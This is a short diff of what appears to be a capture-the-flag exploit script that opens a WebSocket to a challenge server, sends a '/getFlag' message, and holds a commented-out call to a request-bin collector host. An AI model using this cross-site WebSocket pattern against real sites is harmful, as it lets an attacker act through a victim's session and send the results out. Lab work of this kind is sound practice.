@@ -13,10 +13,17 @@
     // fetch('https://iwacdvb.request.dreamhack.games')
 
     const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+    // ws.onopen = function () {
+    //   setTimeout(() => {
+    //     ws.send(JSON.stringify({ message: '/getFlag' }));
+    //   }, 1000);
+    // };
     ws.onopen = function () {
-      setTimeout(() => {
-        ws.send(JSON.stringify({ message: '/getFlag' }));
-      }, 1000);
+      console.log('WebSocket connection established');
+      // Request the flag
+      ws.send(JSON.stringify({
+        message: '/getFlag'
+      }));
     };
 
     ws.onmessage = function (event) {
